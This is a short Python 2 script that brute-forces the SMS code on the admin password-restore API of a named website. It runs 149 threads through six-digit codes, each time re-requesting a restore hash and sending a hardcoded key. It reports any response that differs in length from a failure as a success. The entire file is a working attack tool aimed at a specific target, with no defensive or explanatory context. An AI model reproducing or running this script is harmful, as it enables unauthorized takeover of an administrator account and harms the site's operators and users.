import requests, json
import threading
import Queue
import sys

#http://sherlock-message.ru/admin
def get_hash():
	try:
		r = requests.post("http://sherlock-message.ru/api/admin.restore")
		return json.dumps(r.text, separators=(',', ':')).split(":")[4].replace("\\", "").replace("\"", "").replace("}", "")
	except IndexError:
		pass

def admin_login(hash, code):
	r = requests.post("http://sherlock-message.ru/api/admin.restore", data={"hash": hash, "sms_code": code, "key": "eccbc87e4b5ce2fe28308fd9f2a7baf3"})
	return r.text

class WorkerThread(threading.Thread):
	def __init__(self, queue, tid) :
		threading.Thread.__init__(self)
		self.queue = queue
		self.tid = tid
	def run(self) :
		while True :
			code = None
			try:
				code = self.queue.get(timeout=1)
			except Queue.Empty :
				return
			try:
				code = str(code).rjust(6, "0")
				hash = get_hash()
				res = admin_login(hash, code)
				if len(res) == 95:
					sys.stdout.write("\rfail: code => %s ; res => %s"%(str(code), str(res)))
				else:
					print "Got something!"
					print "Code: "+str(code)
					print str(res)
					self.queue.task_done()
			except:
				raise
			self.queue.task_done()
				
queue = Queue.Queue()
threads = []
for i in range(1, 150):
	worker = WorkerThread(queue, i) 
	worker.setDaemon(True)
	worker.start()
	threads.append(worker)
for code in range(260000, 280000):
	queue.put(code)

queue.join()

for item in threads :
	item.join()